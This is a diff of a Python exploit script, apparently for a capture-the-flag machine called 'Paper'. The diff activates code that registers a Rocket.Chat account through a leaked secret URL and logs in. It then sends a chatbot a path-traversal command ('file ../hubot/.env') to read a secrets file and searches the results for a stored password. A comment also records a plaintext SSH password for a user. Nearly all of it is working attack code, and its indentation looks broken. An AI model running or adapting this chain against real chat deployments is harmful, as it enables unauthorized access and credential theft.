@@ -14,83 +14,75 @@ import base64
 # proxy = {"http": "http://127.0.0.1:8080"}
 # # CVE-2019-17671 viewing unauthenticated posts
 # # https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
-# username = "bakaro15"
-# password = "123"
-# #sha256
-# hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
-# session = requests.session()
-# req = session.get('http://office.paper/?static=1')
+ username = "bakaro15"
+ password = "123"
+ #sha256
+ hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
+ session = requests.session()
+ req = session.get('http://office.paper/?static=1')
+ # register rocketchat account 
+ reg_url = "http://chat.office.paper/api/v1/method.callAnon/registerUser"
+ data = {"message":"{\"msg\":\"method\",\"method\":\"registerUser\",\"params\":[{\"name\":\"%s\",\"email\":\"%s@gmail.com\",\"pass\":\"%s\",\"confirm-pass\":\"%s\",\"secretURL\":\"8qozr226AhkCHZdyY\"}],\"id\":\"5\"}"%(username,username,password,password)}
+ req = session.post(reg_url, json=data)
 
-# # register rocketchat account 
-# reg_url = "http://chat.office.paper/api/v1/method.callAnon/registerUser"
-# data = {"message":"{\"msg\":\"method\",\"method\":\"registerUser\",\"params\":[{\"name\":\"%s\",\"email\":\"%s@gmail.com\",\"pass\":\"%s\",\"confirm-pass\":\"%s\",\"secretURL\":\"8qozr226AhkCHZdyY\"}],\"id\":\"5\"}"%(username,username,password,password)}
-# req = session.post(reg_url, json=data)
-
-# res = json.loads(req.text)["message"]
-# msg = json.loads(res)
-# # check if have result in res
-# if "result" in msg.keys():
-#     print("[+] Register success")
-# else:
-#     print("[-] Register failed")
-#     exit(0)
-
+ res = json.loads(req.text)["message"]
+ msg = json.loads(res)
+ # check if have result in res
+ if "result" in msg.keys():
+     print("[+] Register success")
+ else:
+     print("[-] Register failed")
+     exit(0)
 # # login 
-# login_url = "http://chat.office.paper/api/v1/method.callAnon/login"
-# data = {"message":"{\"msg\":\"method\",\"method\":\"login\",\"params\":[{\"user\":{\"email\":\"%s@gmail.com\"},\"password\":{\"digest\":\"%s\",\"algorithm\":\"sha-256\"}}],\"id\":\"5\"}"%(username,hashed_password)}
-# req = session.post(login_url, json=data)
-# res = json.loads(req.text)["message"]
-# data = json.loads(res)
-# # check if have result in res
-# if "result" in data.keys():
-#     print("[+] Login success")
-#     id = data["result"]["id"]
-#     token = data["result"]["token"]
-#     print ("[+] id: %s"%id)
-#     print ("[+] token: %s"%token)
-# else:
-#     print("[-] Login failed")
-#     exit(0)
-# cookie = {"rc_uid":id, "rc_token":token}
-# header = {"X-Auth-Token":token, "X-User-Id":id}
-
-# # set username
-# setUsr_url = "http://chat.office.paper/api/v1/method.call/setUsername"
-# data = {"message":"{\"msg\":\"method\",\"method\":\"setUsername\",\"params\":[\"%s\"],\"id\":\"5\"}"%(username)}
-# req = session.post(setUsr_url, json=data, cookies=cookie, headers=header)
-# rep = json.loads(req.text)["message"]
-# data = json.loads(rep)
-# # check if have success in res
-# if "result" in data.keys():
-#     print("[+] Set username success")
-# else:
-#     print("[-] Set username failed")
-
+ login_url = "http://chat.office.paper/api/v1/method.callAnon/login"
+ data = {"message":"{\"msg\":\"method\",\"method\":\"login\",\"params\":[{\"user\":{\"email\":\"%s@gmail.com\"},\"password\":{\"digest\":\"%s\",\"algorithm\":\"sha-256\"}}],\"id\":\"5\"}"%(username,hashed_password)}
+ req = session.post(login_url, json=data)
+ res = json.loads(req.text)["message"]
+ data = json.loads(res)
+ # check if have result in res
+ if "result" in data.keys():
+     print("[+] Login success")
+     id = data["result"]["id"]
+     token = data["result"]["token"]
+     print ("[+] id: %s"%id)
+     print ("[+] token: %s"%token)
+ else:
+     print("[-] Login failed")
+     exit(0)
+ cookie = {"rc_uid":id, "rc_token":token}
+ header = {"X-Auth-Token":token, "X-User-Id":id}
+ # set username
+ setUsr_url = "http://chat.office.paper/api/v1/method.call/setUsername"
+ data = {"message":"{\"msg\":\"method\",\"method\":\"setUsername\",\"params\":[\"%s\"],\"id\":\"5\"}"%(username)}
+ req = session.post(setUsr_url, json=data, cookies=cookie, headers=header)
+ rep = json.loads(req.text)["message"]
+ data = json.loads(rep)
+ # check if have success in res
+ if "result" in data.keys():
+     print("[+] Set username success")
+ else:
+     print("[-] Set username failed")
 # # Create direct room with recyclops
-# info_url = "http://chat.office.paper/api/v1/method.call/createDirectMessage"
-# data = {"message":"{\"msg\":\"method\",\"method\":\"createDirectMessage\",\"params\":[\"recyclops\"],\"id\":\"36\"}"}
-# req = session.post(info_url, json=data, cookies=cookie, headers=header)
-
+ info_url = "http://chat.office.paper/api/v1/method.call/createDirectMessage"
+ data = {"message":"{\"msg\":\"method\",\"method\":\"createDirectMessage\",\"params\":[\"recyclops\"],\"id\":\"36\"}"}
+ req = session.post(info_url, json=data, cookies=cookie, headers=header)
 # rep = json.loads(req.text)["message"]
-# res = json.loads(rep)
-# room_id = res["result"]["rid"]
-
+ res = json.loads(rep)
+ room_id = res["result"]["rid"]
 # # send message to recyclops
-# msg_url = "http://chat.office.paper/api/v1/method.call/sendMessage"
-# msg = "recyclops file ../hubot/.env"
-# # msg = "help"
-# data = {"message":"{\"msg\":\"method\",\"method\":\"sendMessage\",\"params\":[{\"rid\":\"%s\",\"msg\":\"%s\"}],\"id\":\"36\"}"%(room_id, msg)}
-# req = session.post(msg_url, json=data, cookies=cookie, headers=header)
+ msg_url = "http://chat.office.paper/api/v1/method.call/sendMessage"
+ msg = "recyclops file ../hubot/.env"
+ # msg = "help"
+ data = {"message":"{\"msg\":\"method\",\"method\":\"sendMessage\",\"params\":[{\"rid\":\"%s\",\"msg\":\"%s\"}],\"id\":\"36\"}"%(room_id, msg)}
+ req = session.post(msg_url, json=data, cookies=cookie, headers=header)
 
-
-# # get response
-# timestamp = int(time.time())-60
-# rs_url = "http://chat.office.paper/api/v1/method.call/rocketchatSearch.search"
-# data = {"message":"{\"msg\":\"method\",\"method\":\"rocketchatSearch.search\",\"params\":[\"/ROCKETCHAT_PASSWORD=/\",{\"rid\":\"%s\",\"uid\":\"%s\"},{\"searchAll\":false}],\"id\":\"40\"}"%(room_id, id)}
-# req = session.post(rs_url, json=data, cookies=cookie, headers=header, proxies=proxy)
-# rep = json.loads(req.text)["message"]
-# res = json.loads(rep)
-
+ # get response
+ timestamp = int(time.time())-60
+ rs_url = "http://chat.office.paper/api/v1/method.call/rocketchatSearch.search"
+ data = {"message":"{\"msg\":\"method\",\"method\":\"rocketchatSearch.search\",\"params\":[\"/ROCKETCHAT_PASSWORD=/\",{\"rid\":\"%s\",\"uid\":\"%s\"},{\"searchAll\":false}],\"id\":\"40\"}"%(room_id, id)}
+ req = session.post(rs_url, json=data, cookies=cookie, headers=header, proxies=proxy)
+ rep = json.loads(req.text)["message"]
+ res = json.loads(rep)
 
 # ssh to dwight with password Queenofblad3s!23
 host = "10.10.11.143"
